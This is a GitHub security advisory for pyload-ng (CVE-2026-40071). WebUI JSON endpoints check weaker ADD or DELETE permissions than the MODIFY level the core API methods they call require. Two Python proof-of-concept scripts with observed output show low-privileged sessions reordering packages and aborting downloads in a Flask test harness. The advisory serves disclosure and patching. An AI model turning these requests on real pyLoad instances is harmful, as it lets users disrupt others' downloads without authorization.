# [M] pyload-ng has a WebUI JSON permission mismatch that lets ADD/DELETE users invoke MODIFY-only actions

## Summary
Severity: Medium
Advisory: GHSA-rfgh-63mg-8pwm
CVE: CVE-2026-40071
CWE: CWE-285, CWE-863
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-rfgh-63mg-8pwm
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0

## Details
### Summary
Several WebUI JSON endpoints enforce weaker permissions than the core API methods they invoke. This allows authenticated low-privileged users to execute `MODIFY` operations that should be denied by pyLoad's own permission model.

Confirmed mismatches:
- `ADD` user can reorder packages/files (`order_package`, `order_file`) via `/json/package_order` and `/json/link_order`
- `DELETE` user can abort downloads (`stop_downloads`) via `/json/abort_link`

### Details
pyLoad defines granular permissions in core API:
- `order_package` requires `Perms.MODIFY` (`src/pyload/core/api/__init__.py:1125`)
- `order_file` requires `Perms.MODIFY` (`src/pyload/core/api/__init__.py:1137`)
- `stop_downloads` requires `Perms.MODIFY` (`src/pyload/core/api/__init__.py:1046`)

But WebUI JSON routes use weaker checks:
- `/json/package_order` uses `@login_required("ADD")` then calls `api.order_package(...)` (`src/pyload/webui/app/blueprints/json_blueprint.py:109-117`)
- `/json/link_order` uses `@login_required("ADD")` then calls `api.order_file(...)` (`src/pyload/webui/app/blueprints/json_blueprint.py:137-145`)
- `/json/abort_link` uses `@login_required("DELETE")` then calls `api.stop_downloads(...)` (`src/pyload/webui/app/blueprints/json_blueprint.py:123-131`)

Why this is likely unintended (not just convenience):
- The same JSON blueprint correctly protects other edit actions with `MODIFY`:
  - `/json/move_package` -> `@login_required("MODIFY")` (`json_blueprint.py:188-196`)
  - `/json/edit_package` -> `@login_required("MODIFY")` (`json_blueprint.py:202-217`)
- The project UI exposes granular per-user permission assignment (`settings.html:184-190`), implying these boundaries are intended security controls.

### PoC
Environment:
- Repository version: `0.5.0b3` (`VERSION` file)
- Commit tested: `ddc53b3d7`

PoC A (ADD-only user invokes MODIFY-only reorder):
```python
import os
import sys
from types import SimpleNamespace

sys.path.insert(0, os.path.abspath('src'))

from flask import Flask
from pyload.core.api import Api, Perms, Role
from pyload.webui.app.blueprints import json_blueprint

class FakeApi:
    def __init__(self):
        self.calls = []

    def user_exists(self, username):
        return username == 'attacker'

    def order_package(self, pack_id, pos):
        self.calls.append(('order_package', int(pack_id), int(pos)))

    def order_file(self, file_id, pos):
        self.calls.append(('order_file', int(file_id), int(pos)))

api = Api(SimpleNamespace(_=lambda x: x))
ctx = {'role': Role.USER, 'permission': Perms.ADD}
print('API auth (ADD-only) order_package:', api.is_authorized('order_package', ctx))
print('API auth (ADD-only) order_file:', api.is_authorized('order_file', ctx))

app = Flask(__name__)
app.secret_key = 'k'
app.config['TESTING'] = True
app.config['WTF_CSRF_ENABLED'] = False
f = FakeApi()
app.config['PYLOAD_API'] = f
app.register_blueprint(json_blueprint.bp)

with app.test_client() as c:
    with c.session_transaction() as s:
        s['authenticated'] = True
        s['name'] = 'attacker'
        s['role'] = int(Role.USER)
        s['perms'] = int(Perms.ADD)

    r1 = c.post('/json/package_order', json={'pack_id': 5, 'pos': 0})
    r2 = c.post('/json/link_order', json={'file_id': 77, 'pos': 1})

print('HTTP /json/package_order:', r1.status_code, r1.get_data(as_text=True).strip())
print('HTTP /json/link_order:', r2.status_code, r2.get_data(as_text=True).strip())
print('calls:', f.calls)
```

Observed output:
```text
API auth (ADD-only) order_package: False
API auth (ADD-only) order_file: False
HTTP /json/package_order: 200 {"response":"success"}
HTTP /json/link_order: 200 {"response":"success"}
calls: [('order_package', 5, 0), ('order_file', 77, 1)]
```

PoC B (DELETE-only user invokes MODIFY-only stop_downloads):
```python
import os
import sys
from types import SimpleNamespace

sys.path.insert(0, os.path.abspath('src'))

from flask import Flask
from pyload.core.api import Api, Perms, Role
from pyload.webui.app.blueprints import json_blueprint

class FakeApi:
    def __init__(self):
        self.calls = []

    def user_exists(self, username):
        return username == 'u'

    def stop_downloads(self, ids):
        self.calls.append(('stop_downloads', ids))

api = Api(SimpleNamespace(_=lambda x: x))
ctx = {'role': Role.USER, 'permission': Perms.DELETE}
print('API auth (DELETE-only) stop_downloads:', api.is_authorized('stop_downloads', ctx))

app = Flask(__name__)
app.secret_key = 'k'
app.config['TESTING'] = True
app.config['WTF_CSRF_ENABLED'] = False
f = FakeApi()
app.config['PYLOAD_API'] = f
app.register_blueprint(json_blueprint.bp)

with app.test_client() as c:
    with c.session_transaction() as s:
        s['authenticated'] = True
        s['name'] = 'u'
        s['role'] = int(Role.USER)
        s['perms'] = int(Perms.DELETE)

    r = c.post('/json/abort_link', json={'link_id': 999})

print('HTTP /json/abort_link:', r.status_code, r.get_data(as_text=True).strip())
print('calls:', f.calls)
```

Observed output:
```text
API auth (DELETE-only) stop_downloads: False
HTTP /json/abort_link: 200 {"response":"success"}
calls: [('stop_downloads', [999])]
```

### Impact
Type:
- Improper authorization / permission-bypass between WebUI and core API permission model.

Scope:
- Horizontal privilege escalation among authenticated non-admin users.
- Not admin takeover, but unauthorized execution of operations explicitly categorized as `MODIFY`.

Security impact:
- Integrity impact: unauthorized queue/file reordering by users lacking `MODIFY`.
- Availability impact: unauthorized abort of active downloads by users lacking `MODIFY`.

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-rfgh-63mg-8pwm
- https://nvd.nist.gov/vuln/detail/CVE-2026-40071
- https://github.com/pyload/pyload
